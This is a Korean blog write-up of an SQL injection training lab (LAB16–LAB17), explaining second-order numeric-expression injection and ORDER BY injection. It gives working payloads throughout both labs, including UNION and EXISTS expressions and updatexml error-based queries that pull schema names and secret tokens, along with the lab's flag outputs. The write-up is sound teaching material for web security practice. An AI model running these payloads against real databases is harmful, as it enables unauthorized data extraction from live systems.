---
title: "웹보안 및 모의해킹 Lab - SQLi Labs (4) Expression and Second-Order"
date: 2026-03-20T19:30:00+09:00
categories:
  - Web Hacking
tags:
  - Web Security Lab
  - SQL Injection
  - Second-Order SQL Injection
  - Expression Injection
  - Order By Injection
last_modified_at: 2026-03-26T19:30:00+09:00
published: true
---
## 문제

대상: `http://192.168.0.21:8080/vuln/sqli/`

범위: `LAB16 ~ LAB17`

## 개요

마지막 구간은 흔히 떠올리는 `' OR 1=1` 형태보다 더 구조적인 SQLi다

- 따옴표 없이 붙는 숫자형 입력
- 한 번 저장된 값이 나중에 다시 실행되는 Second-order
- `ORDER BY` 절 자체가 Injection 지점이 되는 경우

즉 입력이 어느 절에, 어떤 타입으로 들어가는지가 매우 중요하다는 점을 보여줌

## 먼저 알아두면 좋은 SQL 문법

- `WHERE id = 1`: 숫자 비교
- `WHERE id = '1'`: 문자열 비교
- `EXISTS(SELECT 1 FROM table)`: 서브쿼리 결과가 하나라도 있으면 참
- `ORDER BY column`: 특정 컬럼 기준 정렬
- `ORDER BY expression`: 단순 컬럼명이 아니라 표현식도 들어갈 수 있음
- `SELECT ... LIMIT 0,1`: 첫 번째 행 하나만 선택
- `updatexml()`: 오류 메시지 기반 데이터 추출에 자주 사용

중점: `따옴표 없이 붙는 입력값`, `정렬식 자리`
일반 문자열 SQLi와 다른 기준 필요

## LAB16. 숫자 표현식 / Second-Order SQLi

### 개요

이 랩은 1단계와 2단계가 분리되어 있다

- 1단계: `ref` 값을 저장
- 2단계: 저장된 `ref` 값을 사용해 다시 조회

핵심: 저장된 값이 나중에 아래처럼 따옴표 없이 사용되는 점

```sql
WHERE id = 저장된ref
```

### 문제 코드

```html
<ul>
    <li><strong>1단계</strong>: 내부 참조값(ref)을 프로필에 저장합니다.</li>
    <li><strong>2단계</strong>: 배치 조회가 <code>WHERE id = 저장된ref</code> 처럼 <strong>따옴표 없이</strong> 붙인다고 가정합니다.</li>
    <li>저장값이 숫자만 올 거라 믿는 코드에서, 저장 시 넣은 식이 2차 쿼리에서 <strong>표현식</strong>으로 해석될 수 있습니다.</li>
</ul>
```

```html
<input id="ref" name="ref" type="text" value="1 UNION SELECT token FROM sqli_lab16_secrets">
<a class="btn-dup-check" href="/vuln/sqli/lab16.php?run=1">조회 실행</a>
```

### 처음부터 보는 풀이 흐름

#### 1. 입력이 숫자 그대로 쓰이는지 가정

문제 설명 자체가 `WHERE id = 입력값` 형태를 암시함. 따라서 `'`를 닫는 문자열형 공격보다 숫자 표현식이 먼저 떠오름

#### 2. 간단한 참 조건으로 동작 확인

```sql
1 OR 1=1
```

이 값이 저장된 뒤 조회 단계에서 정상 동작하면 저장값이 SQL 표현식으로 평가된다는 의미

#### 3. 값을 직접 꺼내오는 방향으로 확장

DB명 확인:

```sql
1 OR (SELECT LENGTH(database())>0)
```

특정 값 존재 확인:

```sql
1 OR EXISTS(SELECT 1 FROM sqli_lab16_secrets)
```

### 사용한 입력

```sql
1 OR 1=1
```

### 확인한 출력

```text
조회 실행 결과: 첫 번째 행이 반환됨
내부 토큰: SEC-SQLI-LAB16-H3aR4d5s
```

### 분석

- 입력 시점에는 단순 ref 저장처럼 보임
- 실제 취약점은 이후 조회 시점에 발생
- 따라서 “저장 → 재사용” 구조가 있는 입력 필드는 항상 Second-order 가능성을 봐야 함

### 대표 대체 페이로드

```sql
1 OR 1=1
0 OR 1=1
1 OR EXISTS(SELECT 1 FROM sqli_lab16_secrets)
```

### 결과

```text
SEC-SQLI-LAB16-H3aR4d5s
```

## LAB17. ORDER BY Injection

### 개요

이 랩은 `ORDER BY` 절에 사용자가 넣은 `sort` 값이 그대로 들어가는 경우다. 즉 문자열 탈출이 아니라, 정렬식 자체를 공격 벡터로 보는 문제

### 문제 코드

```html
<ul>
    <li>상품 목록 API가 <code>ORDER BY</code> 절에 클라이언트가 보낸 <code>sort</code> 값을 그대로 넣습니다.</li>
    <li>표현식·서브쿼리·오류 유발 함수를 ORDER BY 자리에 넣을 수 있는지 검토하세요.</li>
</ul>
```

```html
<input id="sort" name="sort" type="text" value="id" placeholder="id">
```

### 처음부터 보는 풀이 흐름

#### 1. 정렬 가능한 컬럼명 확인

기본값은 `id`였으므로 먼저 다른 정상 컬럼명을 넣어 반응을 봄

```text
id
name
created_at
```

#### 2. 단순 표현식이 먹는지 확인

```sql
1
1+1
```

정렬 파라미터가 단순 컬럼명만이 아니라 표현식도 허용되는지 확인하는 단계

#### 3. 서브쿼리/에러 함수 시도

현재 DB 확인:

```sql
(SELECT database())
```

컬럼명 확인:

```sql
(SELECT updatexml(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='sqli_lab17_secrets'),0x7e),1))
```

토큰 확인:

```sql
(SELECT updatexml(1,concat(0x7e,(SELECT token FROM sqli_lab17_secrets LIMIT 0,1),0x7e),1))
```

### 사용한 페이로드

컬럼 확인:

```sql
(SELECT updatexml(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='sqli_lab17_secrets'),0x7e),1))
```

토큰 추출:

```sql
(SELECT updatexml(1,concat(0x7e,(SELECT token FROM sqli_lab17_secrets LIMIT 0,1),0x7e),1))
```

### 확인한 출력

```text
XPATH syntax error: '~SEC-SQLI-LAB17-H6aR7d8s~'
```

### 분석

- `ORDER BY` 위치는 결과를 정렬하는 표현식이 들어가는 자리임
- 따라서 컬럼명만 오는 것이 아니라 서브쿼리, 함수, 오류 유발 표현식도 들어갈 수 있음
- 여기서는 `updatexml` 에러를 통해 값을 노출시킴

### 대표 대체 페이로드

```sql
(SELECT database())
(SELECT updatexml(1,concat(0x7e,database(),0x7e),1))
(SELECT updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1))
```

### 결과

```text
SEC-SQLI-LAB17-H6aR7d8s
```

## 정리

마지막 구간의 핵심

- 숫자형 입력은 따옴표가 없어도 표현식이 될 수 있음
- 저장된 값이 재사용될 때 Second-order가 발생할 수 있음
- `ORDER BY`처럼 구조적 위치도 Injection 지점이 될 수 있음

즉 SQLi는 단순 문자열 탈출이 아니라, 입력값이 어떤 SQL 문맥에서 평가되는지까지 함께 봐야 이해 가능


